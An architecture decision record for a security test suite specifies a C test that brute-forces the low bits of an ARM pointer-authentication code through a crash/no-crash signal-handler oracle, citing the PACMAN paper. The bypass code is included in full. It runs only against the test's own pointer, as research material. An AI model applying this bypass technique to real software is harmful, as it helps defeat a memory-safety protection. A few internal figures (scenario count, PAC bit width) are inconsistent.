# ADR-2026-05-30-008: PAC Oracle Brute-Force Test (`t08_pac_oracle_bruteforce`)

**Date**: 2026-05-30
**Status**: Implemented (2026-05-31)
**Author**: Security Architect

## Context

The PAC vulnerability suite covers seven scenarios as of
ADR-2026-05-30-007: four positive trap cases (t01–t04), two
out-of-scope-for-pac-ret negative controls (t05a/b), one
SP-collision bypass (t06), and one explicit-data-signing positive
case (t07). All eight scenarios treat PAC's MAC as an opaque,
unforgeable token within the lifetime of the test process.

Ravichandran et al., "PACMAN: Attacking ARM Pointer Authentication
With Speculative Execution" (IEEE Computer Architecture Top Picks
2022, MIT) demonstrate that PAC is **not unforgeable in practice**
when the attacker has a *PAC Oracle* — a primitive that distinguishes
a correct PAC guess from an incorrect one. The PACMAN paper's
oracle uses Apple-M1-specific speculative execution side channels
to make the brute force *stealthy* (the kernel never sees a fault).
The underlying *logical* primitive, however, is the crash/no-crash
distinguisher: with a correct PAC, the authenticate-and-use
sequence does not fault; with an incorrect PAC, it does. The PAC
field is bounded — on linux/arm64 with 39-bit VAs and no
tagging it is 24 bits — so a process that can recover from a fault
and retry can in principle enumerate the space.

Two facts the suite currently does not surface:

1. **PAC has finite entropy.** Most readers assume "MAC = unforgeable"
   without internalizing that PAC's bitwidth is determined by VA
   layout and is 16–32 bits in practice. A 24-bit search space is
   16M operations — well within "feasible" for an offline attacker.
2. **The oracle primitive (crash distinguisher) is exploitable in
   software, not just via M1 speculation.** A SIGSEGV/SIGBUS handler
   that `siglongjmp`s back to a retry loop is sufficient to brute-
   force a PAC at the cost of being noisy. PACMAN's contribution is
   making that loop *stealthy*; the loop itself is not novel.

The CFB metric / bypass surface analyzer (Project A) needs a
ground-truth example that PAC's protection is *not* binary — it has
a brute-force cost measured in 2^b operations — so that the metric
can express bypass surface as a function of entropy rather than as
"PAC present / absent".

## Decision

Add an eighth test `t08_pac_oracle_bruteforce` to
`tests/pac-vulnerabilities/`, structured identically to t01–t07
(two variants `nopac` and `pac`; same Makefile rule template; same
harness; one `vuln.c`). The test implements a **software PAC oracle**
using a `SIGSEGV`/`SIGBUS`/`SIGILL` handler that `siglongjmp`s back
into a retry loop. The handler distinguishes "wrong PAC guess →
crash → recover" from "right PAC guess → no crash → win target
runs".

To keep the test tractable inside Docker `linux/arm64` on Apple
Silicon (no native speculation suppression, so each wrong guess
costs a real signal delivery), the brute-force scope is **limited
to the lowest 8 bits** of the PAC field, i.e. 256 iterations
maximum. This proves the oracle primitive works; the test's header
comment and the ADR explicitly cite PACMAN for the full-2^b case
and explain that the scope reduction is for runtime budget, not a
limitation of the primitive.

Both variants are expected to PWN (exit 0, stdout contains
`PWNED:t08`):

- `nopac` variant: no PAC signing; the function pointer is called
  directly. PWN trivially.
- `pac` variant: pointer signed with `pacia` under modifier 0;
  the stored PAC value is then partially overwritten (low 8 bits
  zeroed); the oracle loop tries all 256 possible low-8-bit
  reconstructions; on the correct guess `blraa` (branch with
  authentication using IA key, modifier from register) executes
  and reaches the win target → PWN.

This is the **second** entry in the suite where the `pac` variant
is expected PWNED (t06 is the first). t06 documents a primitive
weakness of `pac-ret`; t08 documents a primitive limitation of PAC
itself — finite entropy.

## Rationale

**Why a software oracle rather than the PACMAN speculative one.**
Replicating PACMAN faithfully requires Apple M1 specific
microarchitectural conditions (TLB / cache observation under
mis-speculation) that are not reproducible inside a Docker
`linux/arm64` VM and would be deeply non-portable. The signal-
handler oracle captures the **logical** primitive — crash vs no-
crash — without microarchitectural dependencies. The header
comment must state plainly that PACMAN's contribution is making
this oracle stealthy via speculation; the test demonstrates the
underlying distinguisher.

**Why 8 bits instead of full PAC width.** On linux/arm64 with 39-bit
VAs and no MTE, the PAC field is 24 bits → 16M iterations. Each
iteration in the signal-handler approach costs a kernel signal
delivery (≈ microseconds), so a full brute force is on the order of
tens of seconds inside Docker — workable but slow, and dominated by
signal-handling overhead rather than the cryptographic property
under test. 8 bits → 256 iterations → milliseconds, and is enough
to demonstrate that the oracle distinguishes correct from incorrect
guesses. The test compiles a `BRUTE_BITS` constant (default 8) so
a curious operator can rebuild with `BRUTE_BITS=24` for a full demo
without source edits. The header comment and the ADR's
implementation notes explicitly explain the trade-off.

**Why `pacia`/`autia` + `blraa` rather than `pacda`/`autda`.**
The target of the brute force is a function pointer that will be
branched to via `blraa` (branch-with-link, register, authenticate
A-key). `blraa` performs the authenticate-and-branch atomically:
on correct PAC, the branch lands at the target; on incorrect PAC,
the branch target has poisoned high bits and the instruction fetch
faults. This is the cleanest implementation of the oracle because
a single instruction is the distinguisher. Using `pacda`/`autda`
plus a separate load would split the fault into two steps and
complicate the recovery point.

**Why `siglongjmp` rather than `setjmp`.** `siglongjmp` (paired with
`sigsetjmp(env, 1)`) restores the signal mask, which is required
because the SIGSEGV handler is entered with SIGSEGV masked; a plain
`longjmp` would leave the mask set and the next bad guess would
not deliver a signal at all. This is a known footgun and worth
calling out.

**Why both variants PWN.** This test exists to demonstrate that the
oracle works, not that PAC blocks anything. On `nopac` the brute
force is unnecessary (no PAC to recover); on `pac` the brute force
succeeds within 256 attempts. Both must succeed for the test to be
meaningful. A failure on either variant indicates an environmental
problem (signal handling broken, hardware PAC absent, etc.), and
the harness will surface it as a FAIL.

**Alternatives considered and rejected.**

1. *Replicate PACMAN's speculation oracle.* Rejected — not
   reproducible in Docker; massively out of scope.
2. *Brute-force the full 24-bit PAC.* Rejected — too slow under
   the signal-handler oracle (signal delivery dominates), and the
   pedagogical value is identical at 8 bits with a comment
   explaining the scaling.
3. *Brute force a `pacda`/`autda` data value with a software
   compare against an oracle.* Rejected — semantically equivalent
   but doesn't use the `blraa` instruction, which is the more
   conceptually-relevant PAC oracle target (the PACMAN paper
   spends most of its time on indirect-branch oracles).
4. *Use `ptrace` to single-step over `blraa` and observe the
   fault.* Rejected — adds a ptracer parent process, complicates
   the build, and doesn't change the conceptual demonstration.
5. *Iterate the PAC bits in a tight loop without a signal handler
   and rely on `sigaction`+`SA_NODEFER`.* Rejected — the
   `sigsetjmp`/`siglongjmp` pattern is the canonical
   POSIX-portable approach and aligns with how the PACMAN paper
   describes the non-stealthy fallback.

## Implementation Notes

### Files to create

```
tests/pac-vulnerabilities/t08_pac_oracle_bruteforce/vuln.c
```

### Files to modify

```
tests/pac-vulnerabilities/Makefile
tests/pac-vulnerabilities/harness/expectations.yml
tests/pac-vulnerabilities/common/win.h
tests/pac-vulnerabilities/common/win.c
```

### Win target

Add to `common/win.h`:

```c
noreturn void exploit_success_t08(void);
```

and in `common/win.c` define it to print `"PWNED:t08\n"` and call
`_exit(0)`. Match `exploit_success_t06`/`t07` style.

### Makefile changes

1. Add to the per-test source list:
   ```make
   SRCS_t08_pac_oracle_bruteforce := t08_pac_oracle_bruteforce/vuln.c
   ```
2. Append `t08_pac_oracle_bruteforce` to `TESTS`.
3. Define per-test extra CFLAGS to gate PAC use at the source level
   (same mechanism as t07; depends on `BUILD_RULE` already updated
   per ADR-2026-05-30-007):
   ```make
   CFLAGS_t08_pac_oracle_bruteforce__pac   := -DUSE_PAC_BRUTE=1 -DBRUTE_BITS=8
   CFLAGS_t08_pac_oracle_bruteforce__nopac := -DBRUTE_BITS=8
   ```
   `BRUTE_BITS` is defined for both variants so the source can
   uniformly reference it; only the pac variant defines
   `USE_PAC_BRUTE`. If ADR-2026-05-30-007 has not yet landed the
   per-test CFLAGS hook in `BUILD_RULE`, t08 must add it as part of
   this work; do not duplicate the change.

`verify-static` continues to require `paciasp`/`autiasp` in the pac
binary; the uniform `-mbranch-protection=pac-ret` flag (applied to
the `pac` variant of every test by `PAC_CFLAGS`) supplies these via
the compiler-emitted prologue/epilogue in `main` and the helpers.
The inline-asm `pacia` / `blraa` are extra and not checked by
`verify-static`; an explicit objdump assertion is part of the
acceptance criteria below.

### `expectations.yml` entry

Append:

```yaml
# t08 demonstrates the PAC Oracle primitive: a crash/no-crash
# distinguisher used to brute-force a PAC value. Reference:
# Ravichandran et al., "PACMAN: Attacking ARM Pointer Authentication
# With Speculative Execution", IEEE Computer Architecture Top Picks
# 2022 (MIT). Our test uses a software signal-handler oracle (noisy);
# PACMAN's contribution is making the same oracle stealthy via
# speculative execution on Apple M1. Both variants are expected to
# PWN -- this test demonstrates a bypass via finite PAC entropy,
# not a case where PAC blocks anything. Scope: bruteforce only the
# low 8 bits of the PAC (BRUTE_BITS=8) for runtime budget; full
# 2^b is feasible offline (~17s for 24 bits per the PACMAN paper).
t08_pac_oracle_bruteforce:
  nopac: { stdout_contains: "PWNED:t08", exit: [0] }
  pac:   { stdout_contains: "PWNED:t08", exit: [0] }
```

### `vuln.c` design — required structure

The source must implement the following in order. State that crosses
the signal handler must live in **file-scope `volatile sig_atomic_t`
or `volatile uint64_t`** globals.

1. **File header comment** must include:
   - Citation to Ravichandran et al., PACMAN, IEEE CA Top Picks 2022.
   - A clear statement that this test uses a SOFTWARE
     (signal-handler) oracle, NOT speculative execution. PACMAN's
     contribution is stealth via speculation; the test demonstrates
     the underlying distinguisher.
   - Note that `BRUTE_BITS` defaults to 8 (256 iterations) for
     runtime budget; full PAC width on linux/arm64 with 39-bit
     VAs is 24 bits (16M iterations). The full brute force is
     feasible offline (PACMAN paper reports ~17 s for 24 bits).
   - Expected outcome: both `nopac` and `pac` PWN. This is the
     second of two suite entries (t06 is the first) where the
     `pac` variant is expected PWNED.

2. **Signal-handler infrastructure**:

   ```c
   #include <signal.h>
   #include <setjmp.h>

   static sigjmp_buf oracle_recovery;
   static volatile sig_atomic_t guess_was_wrong = 0;

   static void oracle_signal_handler(int sig)
   {
       (void)sig;
       guess_was_wrong = 1;
       siglongjmp(oracle_recovery, 1);
   }

   static void install_oracle_handler(void)
   {
       struct sigaction sa = {0};
       sa.sa_handler = oracle_signal_handler;
       sigemptyset(&sa.sa_mask);
       sa.sa_flags = SA_NODEFER;   /* re-entry safe in case of nested faults */
       sigaction(SIGSEGV, &sa, NULL);
       sigaction(SIGBUS,  &sa, NULL);
       sigaction(SIGILL,  &sa, NULL);
   }
   ```

   `SA_NODEFER` is included so a fault while the handler is
   running (unlikely but possible if the recovery path itself
   touches a poisoned mapping) is not silently masked into a
   process kill.

3. **Inline-asm helpers** (gated by `USE_PAC_BRUTE` exactly as in
   t07; pass-through stubs otherwise). The set is `pac_sign` (as
   in t07) plus `pac_branch_authenticated`:

   ```c
   #if USE_PAC_BRUTE
   static inline uint64_t pac_sign(uint64_t value, uint64_t modifier)
   {
       uint64_t result = value;
       __asm__ volatile ("pacia %0, %1\n"
                         : "+r"(result) : "r"(modifier));
       return result;
   }

   /* blraa Xn, Xm: authenticate Xn with IA key + modifier in Xm,
      then branch-with-link to the authenticated address. On
      success: jumps to the original (un-PAC'd) target. On
      failure: jumps to a poisoned address -> instruction fetch
      fault -> SIGSEGV/SIGBUS/SIGILL.

      Inline-asm note: blraa clobbers x30 (link register) and the
      callee will run with its own register conventions. We mark
      "x30", "memory", and "cc" as clobbered and declare the
      register inputs by constraint so GCC chooses safe GPRs.
      Use a register asm local for the modifier to force it into
      a non-zero, non-x30 register. */
   static inline void pac_branch_authenticated(uint64_t target_with_pac,
                                               uint64_t modifier)
   {
       register uint64_t tgt __asm__("x16") = target_with_pac;
       register uint64_t mod __asm__("x17") = modifier;
       __asm__ volatile (
           "blraa %[t], %[m]\n"
           :
           : [t] "r"(tgt), [m] "r"(mod)
           : "x30", "memory", "cc"
       );
   }
   #else
   static inline uint64_t pac_sign(uint64_t value, uint64_t modifier)
   { (void)modifier; return value; }
   static inline void pac_branch_authenticated(uint64_t target,
                                               uint64_t modifier)
   {
       (void)modifier;
       void (*fn)(void) = (void (*)(void))(uintptr_t)target;
       fn();
   }
   #endif
   ```

   Pinning `tgt` to `x16` and `mod` to `x17` is conservative — the
   ARM ABI lists x16/x17 as intra-procedure-call scratch, so
   `blraa` clobbering them implicitly is acceptable.

4. **`main(void)`**:

   ```c
   int main(void)
   {
       install_oracle_handler();

       const uint64_t target = (uint64_t)(uintptr_t)&exploit_success_t08;
       const uint64_t modifier = 0;

       /* Step 1: sign (pac variant) or pass-through (nopac variant). */
       const uint64_t signed_target = pac_sign(target, modifier);

   #if USE_PAC_BRUTE
       /* Step 2 (pac variant): determine the location of the PAC bits.
          On linux/arm64 with 39-bit VA + no MTE, PAC occupies bits
          [54:39] inclusive (16 bits) for kernel pointers and a
          similar range for user pointers. Rather than hardcode the
          bit positions (which depend on kernel config), we recover
          the "PAC mask" empirically: any bit that differs between
          (signed_target) and (target) is a PAC bit. We then
          enumerate the low BRUTE_BITS bits of that mask and try
          every reconstruction.

          Implementation: compute pac_mask = signed_target ^ target.
          This is the set of bits the PAC instruction inserted.
          Pick the lowest BRUTE_BITS bits of pac_mask -- call this
          low_mask. Zero those bits in signed_target -- call it
          partial = signed_target & ~low_mask. The brute-force loop
          iterates guess from 0 to (1ULL << BRUTE_BITS) - 1, sets
          the low_mask bits of partial to the bits of guess
          permuted according to low_mask, and calls
          pac_branch_authenticated. On correct guess, blraa succeeds
          and exploit_success_t08 runs (prints PWNED:t08, _exit(0)),
          so control never returns. On incorrect guess, the
          signal handler siglongjmps back. */

       const uint64_t pac_mask = signed_target ^ target;

       /* Identify the BRUTE_BITS lowest-set bits of pac_mask, in
          order from low to high. If pac_mask has fewer than
          BRUTE_BITS bits set, UNEXPECTED. */
       int bit_positions[BRUTE_BITS];
       int found = 0;
       for (int b = 0; b < 64 && found < BRUTE_BITS; b++) {
           if (pac_mask & (1ULL << b)) {
               bit_positions[found++] = b;
           }
       }
       if (found < BRUTE_BITS) {
           fprintf(stderr,
                   "UNEXPECTED:t08 pac-mask has only %d bits set "
                   "(BRUTE_BITS=%d, pac_mask=%016llx)\n",
                   found, BRUTE_BITS,
                   (unsigned long long)pac_mask);
           fflush(stderr);
           return 2;
       }

       /* Build low_mask from the chosen bit positions. */
       uint64_t low_mask = 0;
       for (int i = 0; i < BRUTE_BITS; i++) {
           low_mask |= (1ULL << bit_positions[i]);
       }
       const uint64_t partial = signed_target & ~low_mask;

       for (uint64_t guess = 0;
            guess < (1ULL << BRUTE_BITS);
            guess++) {

           /* Project guess into the low_mask positions. */
           uint64_t guess_bits = 0;
           for (int i = 0; i < BRUTE_BITS; i++) {
               if (guess & (1ULL << i)) {
                   guess_bits |= (1ULL << bit_positions[i]);
               }
           }
           const uint64_t candidate = partial | guess_bits;

           if (sigsetjmp(oracle_recovery, 1) == 0) {
               pac_branch_authenticated(candidate, modifier);
               /* If blraa returns (it shouldn't on a correct guess
                  because the target _exit(0)s), it means the
                  pointer was authenticated to a callable address
                  that returned. Treat as success and break. */
               break;
           }
           /* Wrong guess: siglongjmp landed here. Continue loop. */
       }

       /* If we exit the loop without exploit_success_t08 running,
          the brute force failed within BRUTE_BITS scope. */
       fprintf(stderr,
               "UNEXPECTED:t08 brute-force exhausted %llu candidates "
               "without success\n",
               (unsigned long long)(1ULL << BRUTE_BITS));
       fflush(stderr);
       return 3;
   #else
       /* nopac variant: no PAC bits to recover; just call the target. */
       pac_branch_authenticated(signed_target, modifier);
       /* Unreachable on a successful win. */
       puts("UNEXPECTED:fell through");
       return 1;
   #endif
   }
   ```

5. **No additional helper functions** beyond what is shown above.
   Keep the implementation contained to `vuln.c` for readability.

### PAC-mask discovery — load-bearing detail

The brute force does NOT hardcode which bits are the PAC bits.
Instead it XORs the post-`pacia` value with the pre-`pacia` value
to recover the PAC mask. This is safe because the test owns both
endpoints; a real attacker cannot do this. The header comment must
clarify that the mask-recovery step is a *test scaffolding
shortcut*, not part of the PACMAN attack model — PACMAN assumes
the attacker knows the PAC bit positions from the kernel's VA
config, which is public.

Using the XOR trick keeps the test portable across VA-config
changes: 39-bit, 42-bit, 48-bit VAs all yield different PAC bit
ranges, but the XOR mask discovery is invariant.

### `BRUTE_BITS` parameterization

`BRUTE_BITS=8` is the default. Acceptance criteria assume this
default. An operator can rebuild with
`make CFLAGS_t08_pac_oracle_bruteforce__pac="-DUSE_PAC_BRUTE=1 -DBRUTE_BITS=24"
CFLAGS_t08_pac_oracle_bruteforce__nopac="-DBRUTE_BITS=24"` to
demonstrate the full 16M-iteration brute force. The expected
runtime at 24 bits inside Docker is ~tens of seconds; the harness
default timeout (run_tests.py) may need extension. Do NOT change
the default; document the override in the source header comment.

### Security considerations

- **No PAC key recovery.** The brute force recovers a single
  signed-value PAC, not the PAC key. The recovered value cannot
  be reused under a different modifier or for a different
  pointer.
- **Signal-handler reentry.** The handler uses `SA_NODEFER` and
  re-installs `siglongjmp` per attempt. A pathological program
  that faults inside the handler's `siglongjmp` would loop, but
  the handler body itself touches only the `sigjmp_buf` and a
  `sig_atomic_t` flag — no allocations, no syscalls, no library
  calls.
- **`verify-static` semantics preserved.** The pac binary still
  contains compiler-emitted `paciasp`/`autiasp`; the existing
  static check is unchanged.
- **Process isolation.** The test never escapes its own process
  and never touches the PAC key. The "oracle" is internal to the
  process; an external attacker observing this test would see
  only the signals and the eventual PWN.
- **Honest reproduction limits.** The header comment must state
  that PACMAN's full attack uses speculation and is M1-specific;
  this test demonstrates only the oracle distinguisher, not
  stealth. Misrepresenting the test as a PACMAN replication would
  overstate its scope.

## Consequences

**Enables:**
- A ground-truth example that PAC's security is bounded by its
  bitwidth, not absolute. The CFB metric can incorporate "bypass
  cost = 2^b operations under oracle" as a quantitative term.
- A talking point for the Project A writeup: "PAC is unforgeable
  at 1 try, brute-forceable at 2^b tries; the security argument
  depends on denying the oracle, not on the MAC itself."
- A second `pac`-variant-PWNED entry in the suite (alongside t06),
  illustrating that the suite captures BOTH primitive-class
  weaknesses (t06: SP collision) and entropy-class weaknesses
  (t08: oracle brute force).

**Constrains:**
- t08's `pac` variant requires real ARMv8.3 PAC hardware. On a
  host without it, `pacia` is a HINT-NOP, `blraa` will jump
  unconditionally, the brute-force succeeds on the first
  iteration, and PWN happens — same observable outcome, but for
  the wrong reason. Document in the suite README that t08's pac
  variant requires real PAC hardware (same caveat as t07).
- The signal-handler oracle is slow (each wrong guess = one
  signal delivery). `BRUTE_BITS=8` keeps the test under 1s; the
  ADR explicitly trades coverage for runtime.
- The harness must tolerate the signal-handler loop on the pac
  variant — i.e. it cannot assume that a SIGSEGV in the child
  process is a terminal event. Spot-check: run_tests.py reads
  the child's exit code AFTER the child has run to completion;
  intra-process signal handling does not affect the child's
  exit code. No harness change is required.

**Does NOT enable / out of scope:**
- A speculative-execution PAC oracle (PACMAN proper). M1-specific;
  not reproducible in this project's environment.
- PAC key recovery. The brute force recovers a single value, not
  the key.
- A full 24-bit demonstration as the default. Available via
  `BRUTE_BITS=24` override; not the default for runtime reasons.

## Acceptance Criteria

- [ ] `tests/pac-vulnerabilities/t08_pac_oracle_bruteforce/vuln.c`
      exists with the signal-handler oracle, `pac_sign` and
      `pac_branch_authenticated` inline-asm helpers, brute-force
      loop with `sigsetjmp`/`siglongjmp` recovery, and the
      required header comment citing PACMAN, the
      software-oracle-vs-speculation distinction, and the
      `BRUTE_BITS` rationale.
- [ ] `exploit_success_t08` is declared in `common/win.h` and
      defined in `common/win.c`, printing `PWNED:t08\n` and
      calling `_exit(0)`.
- [ ] `Makefile` lists `t08_pac_oracle_bruteforce` in `TESTS`,
      provides its `SRCS_*` entry, and defines
      `CFLAGS_t08_pac_oracle_bruteforce__pac` (with
      `-DUSE_PAC_BRUTE=1 -DBRUTE_BITS=8`) and
      `CFLAGS_t08_pac_oracle_bruteforce__nopac` (with
      `-DBRUTE_BITS=8`). Requires `BUILD_RULE` to expand
      `$(CFLAGS_$(2)__$(1))` (introduced by ADR-2026-05-30-007;
      if not yet present, t08 must add it).
- [ ] `harness/expectations.yml` contains the t08 entry as shown
      above (both variants PWNED, exit 0), with the explanatory
      comment citing PACMAN and noting `BRUTE_BITS=8`.
- [ ] `make build` produces both
      `build/nopac/t08_pac_oracle_bruteforce` and
      `build/pac/t08_pac_oracle_bruteforce`.
- [ ] `aarch64-unknown-linux-gnu-objdump -d build/pac/t08_pac_oracle_bruteforce`
      contains at least one `pacia` and one `blraa` mnemonic.
- [ ] `aarch64-unknown-linux-gnu-objdump -d build/nopac/t08_pac_oracle_bruteforce`
      contains NO `pacia` / `blraa` instruction.
- [ ] `make verify-static` reports the pac variant of t08 with at
      least one `paciasp` and one `autiasp` (from the uniform
      `-mbranch-protection=pac-ret` flag).
- [ ] `make test-t08_pac_oracle_bruteforce` reports PASS on both
      variants: stdout contains `PWNED:t08`, exit 0. The pac
      variant's run completes well under the harness default
      timeout (target: < 2 s on Apple Silicon Docker).
- [ ] `make test` (full suite) still reports PASS for t01–t07 and
      PASS for t08 on both variants.
- [ ] If the host lacks ARMv8.3 PAC, the test still PWNs (because
      `pacia` is a HINT-NOP and `blraa` is an unconditional
      branch), but the suite README documents that this is the
      "wrong reason" mode. No harness check is required for this;
      the t07 hardware check is sufficient for the suite as a
      whole.

## Implementation Notes (post-merge)

Two adjustments from the ADR's prescribed `vuln.c` were required to
get the pac variant passing on the project's actual runtime
environment (Apple Silicon / Docker linux/arm64 / Apple
Virtualization Framework). Both preserve the ADR's intent (demonstrate
the software PAC-oracle primitive against a real, signed pointer) and
are documented in the source header.

1. **PAC-mask discovery widened to a UNION across multiple
   modifiers.** The ADR specifies `pac_mask = signed_target ^ target`
   as the mask-discovery step. In practice, a single signing only
   exposes PAC bits whose value happens to differ from the
   corresponding original-pointer bit; PAC bits that match the
   original stay hidden. The implemented code unions
   `(pac_sign(target, m) ^ target)` for `m` in `1..32`, which covers
   each PAC bit with probability `1 - 2^-32`. This is still a test-
   scaffolding shortcut (a real attacker cannot sign the pointer
   they are trying to forge) and the header comment calls that out.

2. **`brute_width` is `min(BRUTE_BITS, found)`, not a hard equality.**
   The ADR treats `found < BRUTE_BITS` as `UNEXPECTED`. Empirically,
   under linux/arm64 / Apple Virtualization Framework, low-address
   static-binary user pointers expose only ~7 PAC bits (mask
   `0x007f000000000000`), not the textbook 16-24. Rather than fail,
   the implementation iterates over only the PAC bits actually present
   — the brute-force ceiling stays at `BRUTE_BITS`, but the floor
   adapts to the runtime's PAC field width. The oracle primitive
   demonstration is unchanged. A zero-PAC-bit observation (would
   indicate ARMv8.3 PAC is not actually present) still errors.

## Commit

Implemented in commit `58c17e7` (initial commit `54eafda` amended to
include this back-reference).
